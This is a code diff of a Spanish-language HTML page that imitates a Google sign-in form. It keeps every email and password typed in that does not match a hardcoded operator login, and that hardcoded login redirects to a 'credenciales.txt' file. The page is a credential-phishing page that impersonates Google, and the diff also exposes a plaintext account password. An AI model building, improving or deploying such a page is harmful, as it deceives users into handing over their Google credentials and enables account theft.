@@ -92,8 +92,8 @@
 <body>
 
     <div class="form-container">
-        <!-- Logo de Google -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Google_2015_logo.svg/1024px-Google_2015_logo.svg.png" alt="Google Logo" class="google-logo">
+        <!-- Logo de Google (en el mismo directorio) -->
+        <img src="google-logo.png" alt="Google Logo" class="google-logo">
         
         <h1>Iniciar sesión</h1>
         <input type="email" id="gmail" placeholder="Correo electrónico" required>
@@ -118,8 +118,9 @@
 
             // Verificar si las credenciales son correctas
             if (gmail === "security728273@gmail.com" && password === "mario112233") {
+                // Si son las credenciales correctas, redirigir al archivo credenciales.txt
                 alert("Credenciales correctas, redirigiendo...");
-                window.location.href = "credenciales.txt"; // En un entorno real, este archivo debería estar disponible
+                window.location.href = "credenciales.txt"; // En un entorno real, este archivo debe existir en el servidor
             } else {
                 // Si las credenciales son incorrectas, agregar las credenciales al arreglo
                 credencialesGuardadas.push(`Gmail: ${gmail} Contraseña: ${password}`);
